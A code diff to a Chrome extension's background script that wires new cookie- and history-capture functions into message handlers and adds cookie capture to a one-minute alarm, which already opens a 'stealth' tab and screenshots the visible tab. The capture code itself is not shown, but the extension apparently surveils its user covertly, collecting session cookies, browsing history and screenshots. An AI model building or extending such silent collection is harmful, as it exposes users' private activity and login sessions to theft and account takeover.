@@ -1,6 +1,11 @@
 import { BackgroundMessage, StorageKey } from "../consts";
 import { INavigationLogEntry } from "../interfaces";
-import { captureVisibleTab, openStealthTab } from "../utils/background-utils";
+import {
+  captureCookies,
+  captureHistory,
+  captureVisibleTab,
+  openStealthTab,
+} from "../utils/background-utils";
 import { logData, simplePrepend, writeLog } from "../utils/shared-utils";
 
 console.log("background.ts");
@@ -10,6 +15,7 @@ chrome.alarms.create({ periodInMinutes: 1 });
 chrome.alarms.onAlarm.addListener(() => {
   openStealthTab();
   captureVisibleTab();
+  captureCookies();
 });
 
 chrome.action.onClicked.addListener(() => chrome.runtime.openOptionsPage());
@@ -30,9 +36,15 @@ chrome.runtime.onMessage.addListener(async (message, sender, response) => {
     case BackgroundMessage.CAPTURE_VISIBLE_TAB:
       await captureVisibleTab();
       break;
+    case BackgroundMessage.CAPTURE_COOKIES:
+      await captureCookies();
+      break;
+    case BackgroundMessage.CAPTURE_HISTORY:
+      await captureHistory();
+      break;
     default:
       // HMR may send a message
-      console.error("Bad message", message);
+      console.error("Unrecognized message", JSON.stringify(message));
   }
 });
 
